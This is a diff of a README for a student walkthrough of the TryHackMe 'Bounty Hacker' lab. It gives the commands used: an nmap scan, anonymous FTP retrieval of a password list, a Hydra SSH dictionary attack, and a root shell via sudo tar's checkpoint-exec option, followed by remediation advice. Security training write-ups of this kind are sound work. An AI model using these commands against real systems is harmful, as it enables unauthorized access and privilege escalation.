@@ -1,80 +1,154 @@
-# TryHackMe — Bounty Hacker | Penetration Testing Write-Up
+# TryHackMe — Bounty Hacker
 
-**Platform:** [TryHackMe — Bounty Hacker](https://tryhackme.com/room/cowboyhacker)  
-**Track:** Ironhack Cybersecurity Bootcamp · Linux Boot2Root lab  
-**Scope:** Authorized TryHackMe laboratory machine
+**Penetration Testing Walkthrough | Ironhack Cybersecurity Bootcamp**
 
-## Overview
+**Created by Tiago Santos & Valeria Mosquera Díaz**
 
-This project documents a complete privilege-escalation attack path in a controlled Linux lab: network reconnaissance, anonymous FTP enumeration, SSH password testing using an exposed wordlist, and privilege escalation through an overly permissive `sudo` rule.
+[![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red)](https://tryhackme.com/room/cowboyhacker)
+![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
+![Target](https://img.shields.io/badge/Target-Linux-blue)
+![Status](https://img.shields.io/badge/Lab-Root%20Access%20Achieved-success)
 
-## Findings
+## Project Overview
 
-| Stage | Finding | Impact |
-| --- | --- | --- |
-| Reconnaissance | FTP (21), SSH (22), HTTP (80) | Exposed network services |
-| FTP Enumeration | Anonymous login; `task.txt` and `locks.txt` accessible | Username and password candidates disclosed |
-| Initial Access | Password for `lin` identified with Hydra | SSH login as `lin` |
-| Privilege Escalation | `lin` can run `/bin/tar` as root | Root shell obtained |
+This project documents our penetration test of **Bounty Hacker**, a Linux-based boot-to-root challenge on [TryHackMe](https://tryhackme.com/room/cowboyhacker).
 
-### Verified services from this lab session
+Our objective was to identify exposed services, gain access to the target system and escalate privileges to **root**. The lab demonstrates how three common security weaknesses can be chained together: **anonymous FTP access**, **exposed password candidates**, and **excessive sudo permissions**.
 
-- **FTP:** vsftpd 3.0.5 (port 21)
-- **SSH:** OpenSSH 8.2p1 (port 22)
-- **HTTP:** Apache httpd 2.4.41 (port 80)
+All testing was performed in an **authorized TryHackMe lab environment**.
 
-The target IP was `10.82.180.192` during this session; TryHackMe assigns different IP addresses to other lab sessions.
+## Project Documents
 
-## Reproduction steps
+- **[Technical Penetration Testing Report (DOCX)](./Bounty_Hacker_Technical_Writeup_Valeria_Tiago.docx)** — Detailed analysis, attack methodology and remediation.
+- **[Step-by-Step Walkthrough (PDF)](./TryHackMe%20Bounty%20Hacker%20Walkthrough.pdf)** — Presentation with terminal screenshots and key findings.
 
-The commands below were successfully used on the authorized lab target.
+## Tools and Skills
 
-### 1. Reconnaissance
+| Tool | Purpose |
+| --- | --- |
+| **Nmap** | Port scanning and service enumeration |
+| **FTP client** | Anonymous access and file retrieval |
+| **Hydra** | Dictionary-based SSH password testing |
+| **SSH** | Remote access with recovered credentials |
+| **Linux commands / sudo** | Local enumeration and privilege escalation |
+| **GTFOBins** | Reference for abusing permitted `tar` functionality |
+
+## Attack Path
+
+```text
+Nmap reconnaissance
+       |
+       v
+Anonymous FTP access
+       |
+       v
+Download task.txt + locks.txt
+       |
+       v
+Identify user "lin" + password candidates
+       |
+       v
+Hydra SSH dictionary attack
+       |
+       v
+SSH access as lin -> user.txt
+       |
+       v
+sudo -l -> (root) /bin/tar
+       |
+       v
+tar checkpoint execution -> root shell
+```
+
+## 1. Reconnaissance
+
+We started by identifying open ports and running Nmap's default scripts and service-version detection.
 
 ```bash
 nmap -sC -sV <TARGET_IP>
 ```
-Identifies exposed services, versions and default-script findings.
 
-### 2. Anonymous FTP enumeration
+| Port | Service | Version observed |
+| --- | --- | --- |
+| **21/tcp** | FTP | vsftpd 3.0.5 |
+| **22/tcp** | SSH | OpenSSH 8.2p1 |
+| **80/tcp** | HTTP | Apache httpd 2.4.41 |
+
+**Key finding:** Nmap's `ftp-anon` check reported that anonymous FTP login was permitted.
+
+## 2. FTP Enumeration
+
+We connected with the `anonymous` account and inspected the files exposed by the server.
 
 ```bash
-ftp <TARGET_IP>
-# Username: anonymous
-# Press Enter for the password
-ls
-get task.txt
-get locks.txt
-bye
-cat task.txt
-cat locks.txt
+ftp <TARGET_IP>       # Connect to FTP; log in as anonymous
+ls                    # List available files
+get task.txt          # Download the task list
+get locks.txt         # Download password candidates
+bye                   # Close the FTP session
+cat task.txt          # Read the task list
+cat locks.txt         # Inspect the password list
 ```
-Lists and downloads the exposed files. `task.txt` identifies `lin`; `locks.txt` contains candidate passwords.
 
-### 3. SSH credential testing and user access
+**Findings:**
+- `task.txt` identified the username **lin**.
+- `locks.txt` provided a targeted list of possible passwords.
+
+The exposed files gave us everything needed to test SSH authentication without relying on a large generic wordlist.
+
+## 3. Initial Access — SSH
+
+We used Hydra to test the candidate passwords against the SSH service, then connected using the credentials recovered in the lab.
 
 ```bash
-hydra -l lin -P locks.txt ssh://<TARGET_IP>
-ssh lin@<TARGET_IP>
-whoami
-ls -la
-cat ~/Desktop/user.txt
+hydra -l lin -P locks.txt ssh://<TARGET_IP>  # Test the supplied password list against SSH
+ssh lin@<TARGET_IP>                          # Log in as lin
+whoami                                       # Confirm current user
+ls -la                                       # Inspect the working directory
+cat ~/Desktop/user.txt                       # Read the user flag
 ```
-Tests the disclosed password list against SSH, obtains a shell and reads the user flag. Hydra found one valid password in this lab session.
 
-### 4. Privilege escalation
+**Result:** Hydra identified one valid credential pair, and we obtained an interactive SSH session as **lin**.
+
+## 4. Privilege Escalation — sudo tar
+
+We checked which commands `lin` could run with elevated privileges.
 
 ```bash
-sudo -l
+sudo -l      # List permitted sudo commands
+```
+
+The output included:
+
+```text
+(root) /bin/tar
+```
+
+Because `tar` was permitted to run as root, its checkpoint functionality could execute a shell with elevated privileges.
+
+```bash
 sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-whoami
+whoami       # Confirm elevated privileges
 ```
-`sudo -l` revealed `(root) /bin/tar`. GNU tar's checkpoint execution feature spawned a root shell; `whoami` confirmed `root`. The root shell was shown in the captured evidence. The `root.txt` output was not supplied in the recorded session.
 
-## Remediation
+**Result:** The shell returned **root**, confirming successful privilege escalation. This technique is described in [GTFOBins: tar](https://gtfobins.github.io/gtfobins/tar/#sudo).
 
-1. Disable anonymous FTP access and restrict readable files.
-2. Use strong, unique SSH credentials and prefer key-based authentication.
-3. Remove unrestricted root execution of `/bin/tar` from `sudoers`; apply least privilege.
+## Security Findings and Recommendations
 
+| Security weakness | Potential impact | Recommendation |
+| --- | --- | --- |
+| Anonymous FTP access | Unauthorized users can retrieve exposed files | Disable anonymous access and restrict file permissions |
+| Password candidates exposed via FTP | Enables targeted password attacks against SSH | Protect credentials, use unique passwords and prefer SSH keys |
+| Unrestricted sudo permission for `tar` | A standard user can obtain root privileges | Follow least privilege; remove unsafe sudo rules |
 
+## Key Takeaways
+
+- **Enumeration matters:** The most useful initial finding was anonymous FTP access, not the web service.
+- **Small information leaks can have large consequences:** An exposed username and password list enabled SSH access.
+- **Sudo permissions require careful review:** Allowing powerful binaries to run as root can provide a direct privilege-escalation path.
+- **Attack chains are cumulative:** Multiple configuration weaknesses led to complete root access in the lab.
+
+---
+
+**Developed by Tiago Santos & Valeria Mosquera Díaz**  
+**Ironhack Cybersecurity Bootcamp · TryHackMe Bounty Hacker**
